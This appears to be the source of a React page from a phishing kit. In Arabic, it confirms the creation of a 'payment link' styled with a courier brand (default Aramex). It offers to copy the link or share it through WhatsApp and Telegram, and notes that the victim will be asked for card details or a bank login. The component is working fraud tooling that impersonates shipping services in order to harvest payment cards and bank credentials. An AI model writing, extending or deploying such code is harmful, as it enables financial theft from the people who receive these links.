import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { 
  CheckCircle2, 
  Copy, 
  Eye, 
  Share2, 
  ExternalLink,
  Package,
  CreditCard,
  Building2
} from "lucide-react";

const LinkCreated = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);
  const [copied, setCopied] = useState(false);

  const countryCode = linkData?.country_code || "";
  const countryData = getCountryByCode(countryCode);
  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const paymentType = linkData?.payload?.payment_type || "card_data";
  
  // Generate the payment link
  const paymentLink = `${window.location.origin}/r/${countryCode?.toLowerCase()}/${linkData?.type}/${id}?service=${serviceKey}`;

  const handleCopyLink = () => {
    navigator.clipboard.writeText(paymentLink);
    setCopied(true);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
    setTimeout(() => setCopied(false), 2000);
  };

  const handlePreview = () => {
    window.open(paymentLink, '_blank');
  };

  const handleCreateAnother = () => {
    navigate(`/create/${countryCode?.toLowerCase()}/shipping`);
  };

  if (isLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" 
      dir="rtl"
    >
      <div className="container mx-auto px-4 max-w-3xl">
        {/* Success Header */}
        <div className="text-center mb-8">
          <div 
            className="w-20 h-20 mx-auto mb-4 rounded-full flex items-center justify-center"
            style={{
              background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
            }}
          >
            <CheckCircle2 className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-3xl font-bold mb-2">تم إنشاء الرابط بنجاح!</h1>
          <p className="text-muted-foreground">يمكنك الآن نسخ الرابط أو معاينته</p>
        </div>

        {/* Link Details Card */}
        <Card className="p-6 mb-6 shadow-elevated">
          <div className="space-y-4">
            {/* Service Info */}
            <div className="flex items-center gap-3 pb-4 border-b">
              <div
                className="w-12 h-12 rounded-lg flex items-center justify-center"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}20, ${branding.colors.secondary}20)`
                }}
              >
                <Package className="w-6 h-6" style={{ color: branding.colors.primary }} />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-lg">{serviceName}</h3>
                <p className="text-sm text-muted-foreground">
                  {countryData?.nameAr}
                </p>
              </div>
              <Badge 
                variant="secondary"
                className="text-xs"
              >
                {countryData?.flag}
              </Badge>
            </div>

            {/* Payment Type */}
            <div className="flex items-center gap-3 py-3 px-4 bg-secondary/30 rounded-lg">
              {paymentType === "card_data" ? (
                <>
                  <CreditCard className="w-5 h-5 text-primary" />
                  <div>
                    <p className="font-medium">نوع الدفع: بيانات البطاقة</p>
                    <p className="text-xs text-muted-foreground">سيتم طلب بيانات البطاقة من العميل</p>
                  </div>
                </>
              ) : (
                <>
                  <Building2 className="w-5 h-5 text-primary" />
                  <div>
                    <p className="font-medium">نوع الدفع: تسجيل الدخول</p>
                    <p className="text-xs text-muted-foreground">سيتم طلب تسجيل الدخول إلى البنك من العميل</p>
                  </div>
                </>
              )}
            </div>

            {/* Link Display */}
            <div className="space-y-2">
              <label className="text-sm font-medium text-muted-foreground">رابط الدفع</label>
              <div className="flex items-center gap-2">
                <div className="flex-1 p-3 bg-muted rounded-lg border">
                  <p className="text-sm font-mono break-all">{paymentLink}</p>
                </div>
              </div>
            </div>
          </div>
        </Card>

        {/* Action Buttons */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
          <Button
            size="lg"
            className="w-full text-base font-semibold"
            onClick={handleCopyLink}
            style={{
              background: copied 
                ? '#10b981' 
                : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
            }}
          >
            {copied ? (
              <>
                <CheckCircle2 className="w-5 h-5 ml-2" />
                <span>تم النسخ!</span>
              </>
            ) : (
              <>
                <Copy className="w-5 h-5 ml-2" />
                <span>نسخ الرابط</span>
              </>
            )}
          </Button>

          <Button
            size="lg"
            variant="outline"
            className="w-full text-base font-semibold"
            onClick={handlePreview}
          >
            <Eye className="w-5 h-5 ml-2" />
            <span>معاينة الرابط</span>
            <ExternalLink className="w-4 h-4 mr-2" />
          </Button>
        </div>

        {/* Share Options */}
        <Card className="p-6 mb-6">
          <h3 className="font-semibold mb-4 flex items-center gap-2">
            <Share2 className="w-5 h-5" />
            <span>مشاركة الرابط</span>
          </h3>
          <div className="grid grid-cols-2 gap-3">
            <Button
              variant="outline"
              className="w-full"
              onClick={() => window.open(`https://wa.me/?text=${encodeURIComponent(paymentLink)}`, '_blank')}
            >
              واتساب
            </Button>
            <Button
              variant="outline"
              className="w-full"
              onClick={() => window.open(`https://t.me/share/url?url=${encodeURIComponent(paymentLink)}`, '_blank')}
            >
              تيليجرام
            </Button>
          </div>
        </Card>

        {/* Create Another Link */}
        <div className="text-center">
          <Button
            variant="ghost"
            onClick={handleCreateAnother}
            className="text-muted-foreground hover:text-foreground"
          >
            إنشاء رابط دفع جديد
          </Button>
        </div>
      </div>
    </div>
  );
};

export default LinkCreated;
